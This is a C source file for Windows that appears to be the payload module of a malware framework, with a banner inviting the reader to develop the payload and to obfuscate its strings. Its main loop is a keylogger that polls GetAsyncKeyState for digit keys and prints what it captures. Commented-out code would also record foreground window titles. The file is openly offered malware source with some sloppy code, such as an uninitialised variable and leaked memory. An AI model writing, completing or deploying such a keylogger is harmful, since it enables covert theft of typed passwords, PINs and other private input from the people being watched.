#include "clientHeader.h"
#include <stdlib.h>
#include <time.h>
#include <Windows.h>
/*
 *	****************************************************************
 *	YOUR PAYLOAD GOES HERE, THIS IS WHERE YOUR DEVELOPMENT WORK WILL
 *	BEGIN. HAVE FUN
 *	****************************************************************
 *
 * 	USE PLStr to secure all your binary strings
 */
int gotchar = 1;
//const time_t hms = time(0);
clock_t Timer, Timer2;
PL_char* GetWindowTitle(HWND CurrentProcess){
	char* CurrentTitle = malloc(0xff); 
	int len = GetWindowTextLengthA(CurrentProcess) + 1;
	char* str = malloc(0x1ff);
	strcpy(str,"ProcessTitle:");
	GetWindowTextA(CurrentProcess, CurrentTitle, len);
	strcat(str,CurrentTitle);
	return str;
}

PL_int GrabKey(int VKPrimary, char Primary, char Secondary, int LastKeystrokeLogged){
	if(GetAsyncKeyState(VKPrimary) != 0 && GetAsyncKeyState(VKPrimary) != 1 && gotchar){
		gotchar = 0;
		if (LastKeystrokeLogged != VKPrimary){
			Timer=clock();
			Timer2 = Timer;
			char c = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
			printf("%c",(char)c);
			LastKeystrokeLogged=VKPrimary;
		}
		if((Timer-clock())/500 && (Timer2-clock())/31){
			Timer2 = clock();
			char c = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
			printf("%c",(char)c);
			LastKeystrokeLogged = VKPrimary;
		}
		fflush(stdout);
	}
	return LastKeystrokeLogged;
}
PL_int main(){
	HWND CurrentProcess = GetForegroundWindow();
	unsigned int LastKeystrokeLogged;

	while(1){
	/*	HWND NewProcess = GetForegroundWindow();
		gotchar = 1;
		if(CurrentProcess == NewProcess){
			if (GetAsyncKeyState(LastKeystrokeLogged) == 0 || GetAsyncKeyState(LastKeystrokeLogged) == 1 ){
					LastKeystrokeLogged=1;
			}*/
			for(int x = 0x30; x<0x3A; x++){
				LastKeystrokeLogged = GrabKey(x,(char)x,(char)x,LastKeystrokeLogged);
			}
		//}
//		}else{
//			printf("%s\n",GetWindowTitle(NewProcess));
//			fflush(stdout); 
//			CurrentProcess = NewProcess;
//		}
		
	}
}
